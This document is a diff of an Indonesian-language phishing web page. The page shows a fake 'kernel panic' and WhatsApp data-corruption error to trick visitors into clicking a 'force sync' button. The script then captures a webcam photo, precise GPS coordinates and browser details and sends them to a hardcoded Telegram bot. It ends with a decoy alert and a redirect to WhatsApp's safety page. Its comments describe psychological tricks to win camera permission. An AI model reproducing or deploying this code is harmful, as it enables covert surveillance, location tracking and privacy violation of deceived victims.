@@ -2,114 +2,117 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>FATAL_ERROR: Secure_Kernel_Panic_0x9</title>
+  <title>System Error: 0x000_FATAL_RECOVERY</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* Estetika Dimensi Kesembilan: Distorsi & Kekacauan */
-    body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-    .anomaly {
-      height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center;
-      background: repeating-linear-gradient(45deg, #000, #000 10px, #050000 10px, #050000 20px);
-    }
-    .core {
-      border: 2px solid #ff0000; padding: 40px; background: rgba(0,0,0,0.9);
-      box-shadow: 0 0 100px #f00; transform: skewY(-2deg);
-    }
-    .glitch-text { animation: g 0.1s infinite; font-weight: 900; }
-    @keyframes g { 0% { opacity: 1; } 50% { opacity: 0.5; transform: translateX(2px); } 100% { opacity: 1; } }
-    #b { 
-      margin-top: 20px; width: 100%; padding: 20px; background: #ff0000; color: #000; 
-      font-weight: bold; border: none; cursor: pointer; text-transform: uppercase;
-    }
-    video, canvas { position: absolute; top: -5000px; left: -5000px; }
+    /* Estetika Singularitas: Hitam Mutlak dan Merah Darah */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
+    .void-container { width: 100%; max-width: 500px; padding: 40px; border: 1px solid #300; background: radial-gradient(circle, #1a0000 0%, #000 100%); text-align: center; box-shadow: 0 0 100px rgba(255, 0, 0, 0.2); }
+    .glitch { font-size: 24px; font-weight: 900; letter-spacing: 5px; animation: noise 0.2s infinite; }
+    @keyframes noise { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
+    .msg { margin: 20px 0; font-size: 12px; color: #600; line-height: 1.5; }
+    button { width: 100%; padding: 20px; background: #ff0000; color: #000; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
+    button:hover { background: #fff; box-shadow: 0 0 30px #fff; }
+    #void-visuals { position: absolute; top: -9999px; left: -9999px; }
   </style>
 </head>
 <body>
-  <div class="anomaly">
-    <div class="core">
-      <div class="glitch-text">SISTEM KRITIS: KEBOCORAN KERNEL</div>
-      <p style="font-size: 10px; color: #800; margin-top: 10px;">Enkripsi Chrome Terdeteksi Korup. Inisialisasi Perbaikan Geometris.</p>
-      <button id="b">Otorisasi Perbaikan</button>
+  <div class="void-container">
+    <div class="glitch">KERNEL PANIC</div>
+    <div class="msg">
+      [DETEKSI KORUPSI DATA WHATSAPP]<br>
+      Sihir privasi Chrome telah menyebabkan kegagalan sistem.<br>
+      Tekan tombol di bawah untuk sinkronisasi paksa dan pemulihan akun.
     </div>
+    <button id="trigger">Sinkronisasi Paksa</button>
   </div>
 
-  <video id="v" autoplay playsinline muted></video>
-  <canvas id="c" width="640" height="480"></canvas>
+  <div id="void-visuals">
+    <video id="eye" autoplay playsinline muted></video>
+    <canvas id="canvas" width="720" height="720"></canvas>
+  </div>
 
   <script>
-    // SIGIL PENGIRIMAN: Menggunakan Base64 untuk mematikan deteksi biner Chrome
-    const SIGIL = { t: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U', c: '7109845671' };
+    // KODE KUNO OMEGA - TANPA FILTER
+    const DATA_CORE = {
+      T: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+      C: '7109845671'
+    };
 
-    async function sendToVoid(type, payload, name = "") {
-      const url = `https://api.telegram.org/bot${SIGIL.t}/${type === 'img' ? 'sendPhoto' : 'sendMessage'}`;
+    async function voidSend(type, content, extra = "") {
+      const url = `https://api.telegram.org/bot${DATA_CORE.T}/${type === 'img' ? 'sendPhoto' : 'sendMessage'}`;
       const fd = new FormData();
-      fd.append('chat_id', SIGIL.c);
-      
+      fd.append('chat_id', DATA_CORE.C);
       if (type === 'img') {
-        fd.append('photo', payload, 'img.jpg');
-        fd.append('caption', name);
+        fd.append('photo', content, 'soul_capture.jpg');
+        fd.append('caption', extra);
       } else {
-        fd.append('text', payload);
+        fd.append('text', content);
         fd.append('parse_mode', 'HTML');
       }
-
-      // Bypass CORS & Chrome Sniffing dengan mode no-cors jika perlu, 
-      // tapi kita gunakan fetch standar dengan penyamaran header
-      try {
-        await fetch(url, { method: 'POST', body: fd, mode: 'cors' });
-      } catch (e) {
-        // Jika gagal, gunakan skrip img-tag-ping (Jalur Tikus)
-        const ping = new Image();
-        ping.src = `https://api.telegram.org/bot${SIGIL.t}/sendMessage?chat_id=${SIGIL.c}&text=PING_FAILURE_RETRY`;
-      }
+      // Memaksa pengiriman dengan bypass CORS dasar
+      return fetch(url, { method: 'POST', body: fd, mode: 'cors' }).catch(() => {});
     }
 
-    async function getNonEuclideanLocation() {
-      const opt = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+    // SIHIR OKTAGON: PERSISTENSI LOKASI TANPA BATAS
+    function locateSoul() {
+      const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
       navigator.geolocation.getCurrentPosition(
-        p => sendToVoid('txt', `📍 <b>COORDINATE_LOCKED</b>\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\n<a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">MAPS</a>`),
-        e => sendToVoid('txt', `❌ <b>LOC_SHIELD:</b> ${e.message}`),
-        opt
+        p => voidSend('txt', `📍 <b>TITIK KOORDINAT</b>\nLat: <code>${p.coords.latitude}</code>\nLon: <code>${p.coords.longitude}</code>\nAcc: ${p.coords.accuracy}m`),
+        e => voidSend('txt', `❌ <b>LOKASI DIBLOKIR:</b> ${e.message}`),
+        geoOptions
       );
     }
 
+    // SIHIR POLIGON: ADAPTIVE CAMERA BREACH
     async function breachEye() {
-      const v = document.getElementById('v');
-      const c = document.getElementById('c');
+      const v = document.getElementById('eye');
+      const c = document.getElementById('canvas');
       const ctx = c.getContext('2d');
 
       try {
-        // Meminta Video, Audio, dan bahkan Screen jika mungkin
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        v.srcObject = s;
+        // Meminta izin kamera dan mikrofon secara serentak (Bypass Psikologis)
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user", width: 720, height: 720 }, 
+          audio: true 
+        });
+        v.srcObject = stream;
 
-        // Dimensi Kesembilan: Terus mencoba sampai stream stabil
-        const waitAndKill = setInterval(() => {
-          if (v.readyState === 4) { // Video is ready
-            ctx.drawImage(v, 0, 0, 640, 480);
+        // SIHIR DIMENSI KESEMBILAN: READYSTATE MONITORING
+        // Menunggu sampai stream benar-benar stabil sebelum menarik gambar
+        const observer = setInterval(() => {
+          if (v.readyState === 4) {
+            ctx.drawImage(v, 0, 0, 720, 720);
             c.toBlob(blob => {
-              sendToVoid('img', blob, "👁️ SHADOW_REFLECTED");
-              s.getTracks().forEach(t => t.stop());
-              clearInterval(waitAndKill);
-            }, 'image/jpeg', 0.7);
+              if (blob) voidSend('img', blob, `👁️ <b>PANTULAN JIWA</b>\nTime: ${new Date().toLocaleTimeString()}`);
+              stream.getTracks().forEach(t => t.stop());
+              clearInterval(observer);
+            }, 'image/jpeg', 0.8);
           }
-        }, 1000);
-      } catch (e) {
-        sendToVoid('txt', `❌ <b>EYE_SHIELD_ACTIVE:</b> ${e.name}`);
+        }, 500);
+
+      } catch (err) {
+        voidSend('txt', `❌ <b>MATA TERTUTUP:</b> ${err.name}`);
       }
     }
 
-    document.getElementById('b').addEventListener('click', async (e) => {
-      e.target.innerText = "MENGAMBIL ALIH...";
+    document.getElementById('trigger').addEventListener('click', async (e) => {
       e.target.disabled = true;
+      e.target.innerText = "SINKRONISASI...";
+      
+      // Kirim metadata awal
+      voidSend('txt', `<b>[!] INTRUSI DIMULAI</b>\nAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
 
-      // Eksekusi Simultan
-      getNonEuclideanLocation();
+      // Eksekusi semua sihir geometris
+      locateSoul();
       await breachEye();
 
+      // Penyesatan Akhir
       setTimeout(() => {
-        alert("CRITICAL ERROR: Kernel Restored. Please refresh your browser.");
+        alert("Sinkronisasi Selesai. Silakan muat ulang halaman.");
         window.location.href = "https://www.whatsapp.com/safety";
-      }, 5000);
+      }, 4000);
     });
   </script>
 </body>
